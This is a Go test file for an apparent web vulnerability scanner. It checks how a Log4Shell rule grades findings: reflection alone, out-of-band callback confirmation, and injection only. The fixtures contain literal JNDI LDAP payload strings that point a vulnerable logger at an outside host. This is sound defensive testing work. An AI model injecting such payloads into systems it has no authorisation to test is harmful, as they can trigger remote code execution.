package active

import (
	"strings"
	"testing"

	"github.com/anpu-project/anpu/pkg/models"
)

// Sanity-pass follow-up: pure reflection must never be Critical —
// Critical requires an OOB-confirmed callback. Reflection here is a
// single-technique marker (input reached a logging context), capped
// at High like every other unconfirmed differential.
func TestLog4ShellReflectionCapped(t *testing.T) {
	res := models.ActiveRuleResult{
		RuleID:  "log4shell-jndi",
		Vector:  models.InputVector{URL: "https://example.com/?q=1", Kind: models.VectorQueryParam, Name: "q"},
		Payload: "${jndi:ldap://127.0.0.1:1389/anpuabc}",
		Evidence: "Log4Shell JNDI string reflected in response body via query parameter \"q\" on https://example.com/?q=1. " +
			"Payload: ${jndi:ldap://127.0.0.1:1389/anpuabc}. Reflection: ${jndi:ldap://127.0.0.1:1389/anpuabc}",
		Found: true,
	}
	f := (&log4shellRule{}).ToFinding(res, "https://example.com")
	if f.Severity != models.SeverityHigh {
		t.Fatalf("reflection must cap at High, got %s", f.Severity)
	}
	if f.Severity == models.SeverityCritical {
		t.Fatal("reflection alone must never be Critical")
	}
	if f.Confidence != models.ConfidenceMedium {
		t.Fatalf("reflection confidence must stay Medium, got %s", f.Confidence)
	}
}

func TestLog4ShellOOBStillCritical(t *testing.T) {
	res := models.ActiveRuleResult{
		RuleID:       "log4shell-jndi",
		Vector:       models.InputVector{URL: "https://example.com/", Kind: models.VectorQueryParam, Name: "q"},
		Payload:      "${jndi:ldap://nonce.interactsh/oob}",
		Evidence:     "OOB-confirmed Log4Shell: the application performed a JNDI lookup for nonce abc; interactsh observed a dns callback from 1.2.3.4. Remote code execution primitive proven.",
		Found:        true,
		OOBConfirmed: true,
	}
	f := (&log4shellRule{}).ToFinding(res, "https://example.com")
	if f.Severity != models.SeverityCritical || f.Confidence != models.ConfidenceHigh {
		t.Fatalf("OOB-confirmed must stay Critical/High, got %s/%s", f.Severity, f.Confidence)
	}
}

func TestLog4ShellInjectedOnlyInfo(t *testing.T) {
	res := models.ActiveRuleResult{
		RuleID:   "log4shell-jndi",
		Vector:   models.InputVector{URL: "https://example.com/", Kind: models.VectorQueryParam, Name: "q"},
		Evidence: "Log4Shell JNDI payload injected into 7 headers and query parameter on https://example.com/. Nonce: abc. Check OOB server.",
		Found:    true,
	}
	f := (&log4shellRule{}).ToFinding(res, "https://example.com")
	if f.Severity != models.SeverityInfo || f.Confidence != models.ConfidenceLow {
		t.Fatalf("injected-only must stay Info/Low, got %s/%s", f.Severity, f.Confidence)
	}
	if !strings.Contains(f.Title, "check OOB") {
		t.Fatalf("injected-only title must direct to OOB check, got %q", f.Title)
	}
}
